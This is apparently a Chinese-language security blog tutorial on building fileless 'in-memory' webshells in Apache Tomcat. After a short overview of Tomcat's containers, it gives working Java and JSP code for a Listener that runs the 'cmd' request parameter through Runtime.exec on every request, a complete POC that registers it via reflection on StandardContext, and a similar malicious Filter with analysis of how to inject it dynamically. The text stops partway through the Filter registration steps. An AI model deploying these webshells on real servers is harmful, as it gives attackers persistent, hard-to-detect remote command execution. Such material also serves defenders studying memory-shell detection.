<p>一个Container对应一个Engine，一个Engine可以包含多个Host，一个Host可以包含多个Context，Context又包含多个Wrapper，各子容器的功能如下</p>
<h4 id="Engine"><a href="#Engine" class="headerlink" title="Engine"></a>Engine</h4><p>可以看成是容器对外提供功能的入口，每个Engine是Host的集合，用于管理各个Host。</p>
<h4 id="Host"><a href="#Host" class="headerlink" title="Host"></a>Host</h4><p>可以看成一个<code>虚拟主机</code>，一个Tomcat可以支持多个虚拟主机。</p>
<h4 id="Context"><a href="#Context" class="headerlink" title="Context"></a>Context</h4><p>又叫做上下文容器，我们可以将其看成一个Web应用，每个Host里面可以运行多个Web应用。同一个Host里面不同的Context，其contextPath必须不同，默认Context的contextPath为空格(“”)或斜杠(&#x2F;)。</p>
<h4 id="Wrapper"><a href="#Wrapper" class="headerlink" title="Wrapper"></a>Wrapper</h4><p>是对Servlet的抽象和包装，每个Context可以有多个Wrapper，用于支持不同的Servlet每个Wrapper实例表示一个具体的Servlet定义，Wrapper主要负责管理 Servlet ，包括的 Servlet 的装载、初始化、执行以及资源回收。</p>
<p>可以用一张图来表示请求在Container中的解析过程</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/04/%E5%9B%BE%E7%89%87-72.png" alt="img"></p>
<p>以上的映射信息通过通过Mapper组件来关联。Mapper组件保存了Web应用的配置信息，容器组件与访问路径的映射关系等。</p>
<h1 id="Tomcat内存马"><a href="#Tomcat内存马" class="headerlink" title="Tomcat内存马"></a>Tomcat内存马</h1><p>Tomcat内存马大致可以分为三类，分别是Listener型、Filter型、Servlet型。即Java Web核心的三大组件,Tomcat内存马的核心原理就是动态地将恶意组件添加到正在运行的Tomcat服务器中。</p>
<p>Servlet在3.0版本之后能够支持动态注册组件。而Tomcat直到7.x才支持Servlet3.0，因此通过动态添加恶意组件注入内存马的方式适合Tomcat7.x及以上</p>
<h3 id="Listener型"><a href="#Listener型" class="headerlink" title="Listener型"></a>Listener型</h3><p>根据以上思路，我们的目标就是在服务器中动态注册一个恶意的Listener。而Listener根据事件源的不同，大致可以分为如下三种</p>
<ul>
<li>ServletContextListener</li>
<li>HttpSessionListeners</li>
<li>ServletRequestListener</li>
</ul>
<p>很明显，ServletRequestListener是最适合用来作为内存马的。因为ServletRequestListener是用来监听ServletRequest对象的，当我们访问任意资源时，都会触发<code>ServletRequestListener#requestInitialized()</code>方法。下面我们来实现一个恶意的Listener</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Listener;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestEvent;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.ServletRequestListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebListener;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.http.HttpServletRequest;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebListener</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Li</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"> </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>访问任意路由都可执行命令</p>
<p>下面的问题就是如何将恶意的Listener动态注册进服务器了，下面我们来分析一下Listener的创建过程。</p>
<h4 id="Listener的创建过程"><a href="#Listener的创建过程" class="headerlink" title="Listener的创建过程"></a>Listener的创建过程</h4><p>开启debug模式，我们先来看一下调用栈</p>
<p><img src="https://baicany.github.io/images/image-20230720004847952.png" alt="image-20230720004847952"></p>
<p><code>StandardContext#fireRequestInitEvent</code>调用了我们的Listener，我们跟进看其实现</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="type">boolean</span> <span class="title function_">fireRequestInitEvent</span><span class="params">(ServletRequest request)</span> &#123; </span><br><span class="line">        Object instances[] = getApplicationEventListeners(); </span><br><span class="line">        <span class="keyword">if</span> ((instances != <span class="literal">null</span>) &amp;&amp; (instances.length &gt; <span class="number">0</span>)) &#123;</span><br><span class="line">            <span class="type">ServletRequestEvent</span> <span class="variable">event</span> <span class="operator">=</span></span><br><span class="line">                    <span class="keyword">new</span> <span class="title class_">ServletRequestEvent</span>(getServletContext(), request);</span><br><span class="line">            <span class="keyword">for</span> (Object instance : instances) &#123;</span><br><span class="line">                <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (!(instance <span class="keyword">instanceof</span> ServletRequestListener)) &#123;</span><br><span class="line">                    <span class="keyword">continue</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">ServletRequestListener</span> <span class="variable">listener</span> <span class="operator">=</span> (ServletRequestListener) instance;</span><br><span class="line"> </span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    listener.requestInitialized(event);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Throwable t) &#123;</span><br><span class="line">                    ExceptionUtils.handleThrowable(t);</span><br><span class="line">                    getLogger().error(sm.getString(</span><br><span class="line">                            <span class="string">&quot;standardContext.requestListener.requestInit&quot;</span>,</span><br><span class="line">                            instance.getClass().getName()), t);</span><br><span class="line">                    request.setAttribute(RequestDispatcher.ERROR_EXCEPTION, t);</span><br><span class="line">                    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>关键代码有两处，首先通过<code>getApplicationEventListeners()</code>获取一个Listener数组，然后遍历数组调用<code>listener.requestInitialized(event)</code>方法触发Listener。跟进<code>getApplicationEventListeners()</code>方法</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> Object[] getApplicationEventListeners() &#123;</span><br><span class="line">        <span class="keyword">return</span> applicationEventListenersList.toArray();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>可以看到Listener实际上是存储在*<code>applicationEventListenersList</code>*属性中的</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * The list of instantiated application event listener objects. Note that SCIs and other code may use the</span></span><br><span class="line"><span class="comment"> * pluggability APIs to add listener instances directly to this list before the application starts.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">private</span> List&lt;Object&gt; applicationEventListenersList = <span class="keyword">new</span> <span class="title class_">CopyOnWriteArrayList</span>&lt;&gt;();</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<p>并且我们可以通过<code>StandardContext#addApplicationEventListener()</code>方法来添加Listener</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">addApplicationEventListener</span><span class="params">(Object listener)</span> &#123;</span><br><span class="line">        applicationEventListenersList.add(listener);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<h4 id="获取StandardContext类"><a href="#获取StandardContext类" class="headerlink" title="获取StandardContext类"></a>获取StandardContext类</h4><p>下面的工作就是获取<code>StandardContext</code>类了，在<code>StandardHostValve#invoke</code>中，可以看到其通过request对象来获取<code>StandardContext</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">invoke</span><span class="params">(Request request, Response response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line"></span><br><span class="line">       <span class="comment">// Select the Context to be used for this Request</span></span><br><span class="line">       <span class="type">Context</span> <span class="variable">context</span> <span class="operator">=</span> request.getContext();</span><br></pre></td></tr></table></figure>

<p>同样地，由于JSP内置了request对象，我们也可以使用同样的方式来获取</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>还有另一种获取方式如下</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	<span class="type">WebappClassLoaderBase</span> <span class="variable">webappClassLoaderBase</span> <span class="operator">=</span> (WebappClassLoaderBase) Thread.currentThread().getContextClassLoader();</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) webappClassLoaderBase.getResources().getContext();</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>接着我们编写一个恶意的Listener</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">            <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">            <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    Runtime.getRuntime().exec(cmd);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                    n.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>最后添加监听器</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%</span><br><span class="line">	<span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<h4 id="完整POC"><a href="#完整POC" class="headerlink" title="完整POC"></a>完整POC</h4><p>至此我们可以总结出Listener型内存马的实现步骤</p>
<ol>
<li>获取StandardContext上下文</li>
<li>实现一个恶意Listener</li>
<li>通过StandardContext#addApplicationEventListener方法添加恶意Listener</li>
</ol>
<p>完整POC如下</p>
<figure class="highlight jsp"><table><tr><td class="code"><pre><span class="line">&lt;%@ page contentType=<span class="string">&quot;text/html;charset=UTF-8&quot;</span> language=<span class="string">&quot;java&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.lang.reflect.Field&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;java.io.IOException&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.core.StandardContext&quot;</span> %&gt;</span><br><span class="line">&lt;%@ page <span class="keyword">import</span>=<span class="string">&quot;org.apache.catalina.connector.Request&quot;</span> %&gt;</span><br><span class="line"> </span><br><span class="line">&lt;%!</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Listener</span> <span class="keyword">implements</span> <span class="title class_">ServletRequestListener</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestInitialized</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">            <span class="type">HttpServletRequest</span> <span class="variable">request</span> <span class="operator">=</span> (HttpServletRequest) sre.getServletRequest();</span><br><span class="line">           <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">           <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   Runtime.getRuntime().exec(cmd);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                   n.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">requestDestroyed</span><span class="params">(ServletRequestEvent sre)</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">%&gt;</span><br><span class="line">&lt;%</span><br><span class="line">    <span class="type">Field</span> <span class="variable">reqF</span> <span class="operator">=</span> request.getClass().getDeclaredField(<span class="string">&quot;request&quot;</span>);</span><br><span class="line">    reqF.setAccessible(<span class="literal">true</span>);</span><br><span class="line">    <span class="type">Request</span> <span class="variable">req</span> <span class="operator">=</span> (Request) reqF.get(request);</span><br><span class="line">    <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) req.getContext();</span><br><span class="line"> </span><br><span class="line">    <span class="type">Shell_Listener</span> <span class="variable">shell_Listener</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Shell_Listener</span>();</span><br><span class="line">    context.addApplicationEventListener(shell_Listener);</span><br><span class="line">%&gt;</span><br></pre></td></tr></table></figure>

<p>访问Listener.jsp,此时Tomcat已经添加了我们恶意的Listener，访问任意路由即可触发</p>
<h3 id="Filter型"><a href="#Filter型" class="headerlink" title="Filter型"></a>Filter型</h3><p>仿照Listener型内存马的实现思路，我们同样能实现Filter型内存马。我们知道，在Servlet容器中，Filter的调用是通过FilterChain实现的</p>
<p><img src="https://goodapple.top/wp-content/uploads/2022/05/image.png" alt="img"></p>
<p>同样地，我们先来实现一个恶意的Filter</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> Filter;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">import</span> javax.servlet.*;</span><br><span class="line"><span class="keyword">import</span> javax.servlet.annotation.WebFilter;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@WebFilter(&quot;/*&quot;)</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Shell_Filter</span> <span class="keyword">implements</span> <span class="title class_">Filter</span> &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">doFilter</span><span class="params">(ServletRequest request, ServletResponse response, FilterChain chain)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="type">String</span> <span class="variable">cmd</span> <span class="operator">=</span> request.getParameter(<span class="string">&quot;cmd&quot;</span>);</span><br><span class="line">        <span class="keyword">if</span> (cmd != <span class="literal">null</span>) &#123;</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                Runtime.getRuntime().exec(cmd);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">catch</span> (NullPointerException n) &#123;</span><br><span class="line">                n.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        chain.doFilter(request, response);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://goodapple.top/wp-content/uploads/2022/05/%E5%9B%BE%E7%89%87-19.png" alt="img"></p>
<h4 id="Filter调用分析"><a href="#Filter调用分析" class="headerlink" title="Filter调用分析"></a>Filter调用分析</h4><p>我们在doFilter处打上断点，调用栈如下</p>
<p><img src="https://baicany.github.io/images/image-20230720012853181.png" alt="image-20230720012853181"></p>
<p>跟进<code>ApplicationFilterChain#internalDoFilter</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title function_">internalDoFilter</span><span class="params">(ServletRequest request, ServletResponse response)</span> <span class="keyword">throws</span> IOException, ServletException &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>.pos &lt; <span class="built_in">this</span>.n) &#123;</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="built_in">this</span>.filters[<span class="built_in">this</span>.pos++];</span><br><span class="line"></span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="type">Filter</span> <span class="variable">filter</span> <span class="operator">=</span> filterConfig.getFilter();</span><br><span class="line">                <span class="keyword">if</span> (request.isAsyncSupported() &amp;&amp; <span class="string">&quot;false&quot;</span>.equalsIgnoreCase(filterConfig.getFilterDef().getAsyncSupported())) &#123;</span><br><span class="line">                    request.setAttribute(<span class="string">&quot;org.apache.catalina.ASYNC_SUPPORTED&quot;</span>, Boolean.FALSE);</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> (Globals.IS_SECURITY_ENABLED) &#123;</span><br><span class="line">                    <span class="type">Principal</span> <span class="variable">principal</span> <span class="operator">=</span> ((HttpServletRequest)request).getUserPrincipal();</span><br><span class="line">                    Object[] args = <span class="keyword">new</span> <span class="title class_">Object</span>[]&#123;request, response, <span class="built_in">this</span>&#125;;</span><br><span class="line">                    SecurityUtil.doAsPrivilege(<span class="string">&quot;doFilter&quot;</span>, filter, classType, args, principal);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    filter.doFilter(request, response, <span class="built_in">this</span>);</span><br><span class="line">                &#125;</span><br><span class="line">..........</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>调用了<code>filter.doFilter()</code>，而<code>filter</code>是通过<code>filterConfig.getFilter()</code>得到的，<code>filterConfig</code>定义如下</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">private</span> ApplicationFilterConfig[] filters = <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[<span class="number">0</span>];</span><br><span class="line"></span><br><span class="line"><span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> <span class="built_in">this</span>.filters[<span class="built_in">this</span>.pos++];</span><br></pre></td></tr></table></figure>

<p>一个filterConfig对应一个Filter，用于存储Filter的上下文信息。这里的*<code>filters</code><em>属性是一个ApplicationFilterConfig数组。我们来寻找一下</em><code>ApplicationFilterChain.filters</code>*属性在哪里被赋值。</p>
<p>在<code>StandardWrapperValve#invoke()</code>方法中，通过<code>ApplicationFilterFactory.createFilterChain()</code>方法初始化了一个<code>ApplicationFilterChain</code>类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ApplicationFilterChain</span> <span class="variable">filterChain</span> <span class="operator">=</span> ApplicationFilterFactory.createFilterChain(request, wrapper, servlet);</span><br></pre></td></tr></table></figure>

<p>我们跟进</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">static</span> ApplicationFilterChain <span class="title function_">createFilterChain</span><span class="params">(ServletRequest request,</span></span><br><span class="line"><span class="params">            Wrapper wrapper, Servlet servlet)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line">        <span class="comment">// Request dispatcher in use</span></span><br><span class="line">        filterChain = <span class="keyword">new</span> <span class="title class_">ApplicationFilterChain</span>();</span><br><span class="line"> </span><br><span class="line">        filterChain.setServlet(servlet);</span><br><span class="line">        filterChain.setServletSupportsAsync(wrapper.isAsyncSupported());</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Acquire the filter mappings for this Context</span></span><br><span class="line">        <span class="type">StandardContext</span> <span class="variable">context</span> <span class="operator">=</span> (StandardContext) wrapper.getParent();</span><br><span class="line">        FilterMap filterMaps[] = context.findFilterMaps();</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line"> </span><br><span class="line">        <span class="type">String</span> <span class="variable">servletName</span> <span class="operator">=</span> wrapper.getName();</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Add the relevant path-mapped filters to this filter chain</span></span><br><span class="line">        <span class="keyword">for</span> (FilterMap filterMap : filterMaps) &#123;</span><br><span class="line">            </span><br><span class="line">            ...</span><br><span class="line">            <span class="type">ApplicationFilterConfig</span> <span class="variable">filterConfig</span> <span class="operator">=</span> (ApplicationFilterConfig)</span><br><span class="line">                    context.findFilterConfig(filterMap.getFilterName());</span><br><span class="line">            ...</span><br><span class="line"> </span><br><span class="line">            filterChain.addFilter(filterConfig);</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        ...</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Return the completed filter chain</span></span><br><span class="line">        <span class="keyword">return</span> filterChain;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>这里我省略了函数中一些不重要的判断，从createFilterChain函数中，我们能够清晰地看到filterChain对象的创建过程</p>
<ol>
<li>首先通过<code>filterChain = new ApplicationFilterChain()</code>创建一个空的filterChain对象</li>
<li>然后通过<code>wrapper.getParent()</code>函数来获取<code>StandardContext</code>对象</li>
<li>接着获取<code>StandardContext</code>中的<code>FilterMaps</code>对象，<code>FilterMaps</code>对象中存储的是各Filter的名称路径等信息</li>
<li>最后根据Filter的名称，在<code>StandardContext</code>中获取<code>FilterConfig</code></li>
<li>通过<code>filterChain.addFilter(filterConfig)</code>将一个<code>filterConfig</code>添加到<code>filterChain</code>中</li>
</ol>
<p><img src="https://baicany.github.io/images/image-20230720022008454.png" alt="image-20230720022008454"></p>
<p>可以看到在<code>ApplicationFilterChain#addFilter</code>方法，filterConfig被添加到filters中</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">void</span> <span class="title function_">addFilter</span><span class="params">(ApplicationFilterConfig filterConfig)</span> &#123;</span><br><span class="line"> </span><br><span class="line">        <span class="comment">// Prevent the same filter being added multiple times</span></span><br><span class="line">        <span class="keyword">for</span>(ApplicationFilterConfig filter:filters) &#123;</span><br><span class="line">            <span class="keyword">if</span>(filter==filterConfig) &#123;</span><br><span class="line">                <span class="keyword">return</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">        <span class="keyword">if</span> (n == filters.length) &#123;</span><br><span class="line">            ApplicationFilterConfig[] newFilters =</span><br><span class="line">                <span class="keyword">new</span> <span class="title class_">ApplicationFilterConfig</span>[n + INCREMENT];</span><br><span class="line">            System.arraycopy(filters, <span class="number">0</span>, newFilters, <span class="number">0</span>, n);</span><br><span class="line">            filters = newFilters;</span><br><span class="line">        &#125;</span><br><span class="line">        filters[n++] = filterConfig;</span><br><span class="line"> </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>所以关键就是将恶意Filter的信息添加进FilterConfig数组中，这样Tomcat在启动时就会自动初始化我们的恶意Filter。</p>
<h4 id="FilterConfig、FilterDef和FilterMaps"><a href="#FilterConfig、FilterDef和FilterMaps" class="headerlink" title="FilterConfig、FilterDef和FilterMaps"></a>FilterConfig、FilterDef和FilterMaps</h4><p>跟进到createFilterChain函数中，我们能看到此时的上下文对象<code>StandardContext</code>实际上是包含了这三者的</p>
<p><img src="https://baicany.github.io/images/image-20230720022435521.png" alt="image-20230720022435521"></p>
<p>其中filterConfigs包含了当前的上下文信息<code>StandardContext</code>、以及<code>filterDef</code>等信息</p>
<p>其中<code>filterDef</code>存放了filter的定义，包括filterClass、filterName等信息。对应的其实就是web.xml中的<code>&lt;filter&gt;</code>标签。</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>可以看到，filterDef必要的属性为<code>filter</code>、<code>filterClass</code>以及<code>filterName</code>。</p>
<h5 id="filterDefs"><a href="#filterDefs" class="headerlink" title="filterDefs"></a>filterDefs</h5><figure class="highlight processing"><table><tr><td class="code"><pre><span class="line">filterDefs是一个<span class="built_in">HashMap</span>，以键值对的形式存储filterDef</span><br></pre></td></tr></table></figure>

<h5 id="filterMaps"><a href="#filterMaps" class="headerlink" title="filterMaps"></a>filterMaps</h5><p><code>filterMaps</code>中以array的形式存放各filter的路径映射信息，其对应的是web.xml中的<code>&lt;filter-mapping&gt;</code>标签</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span><span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span><span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>filterMaps必要的属性为<code>dispatcherMapping</code>、<code>filterName</code>、<code>urlPatterns</code></p>
<p>于是下面的工作就是构造含有恶意filter的FilterMaps和FilterConfig对象，并将FilterConfig添加到filter链中了。</p>
<h4 id="动态注册Filter"><a href="#动态注册Filter" class="headerlink" title="动态注册Filter"></a>动态注册Filter</h4><p>经过上面的分析，我们可以总结出动态添加恶意Filter的思路</p>
<ol>
<li>获取StandardContext对象</li>
<li>创建恶意Filter</li>
<li>使用FilterDef对Filter进行封装，并添加必要的属性</li>
<li>创建filterMap类，并将路径和Filtername绑定，然后将其添加到filterMaps中</li>
<li>使用ApplicationFilterConfig封装filterDef，然后将其添加到filterConfigs中</li>
</ol>
<h5 id="获取StandardContext对象"><a href="#获取StandardContext对象" class="headerlink" title="获取StandardContext对象"></a>获取StandardContext对象</h5><p>StandardContext对象主要用来管理Web应用的一些全局资源，如Session、Cookie、Servlet等。因此我们有很多方法来获取StandardContext对象。</p>
<p>Tomcat在启动时会为每个Context都创建个ServletContext对象，来表示一个Context，从而可以将ServletContext转化为StandardContext。</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">//获取ApplicationContextFacade类</span></span><br><span class="line"><span class="type">ServletContext</span> <span class="variable">servletContext</span> <span class="operator">=</span> request.getSession().getServletContext();</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContextFacade类属性context为ApplicationContext类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">appContextField</span> <span class="operator">=</span> servletContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">appContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">ApplicationContext</span> <span class="variable">applicationContext</span> <span class="operator">=</span> (ApplicationContext) appContextField.get(servletContext);</span><br><span class="line"> </span><br><span class="line"><span class="comment">//反射获取ApplicationContext类属性context为StandardContext类</span></span><br><span class="line"><span class="type">Field</span> <span class="variable">standardContextField</span> <span class="operator">=</span> applicationContext.getClass().getDeclaredField(<span class="string">&quot;context&quot;</span>);</span><br><span class="line">standardContextField.setAccessible(<span class="literal">true</span>);</span><br><span class="line"><span class="type">StandardContext</span> <span class="variable">standardContext</span> <span class="operator">=</span> (StandardContext) standardContextField.get(applicationContext);</span><br></pre></td></tr></table></figure>

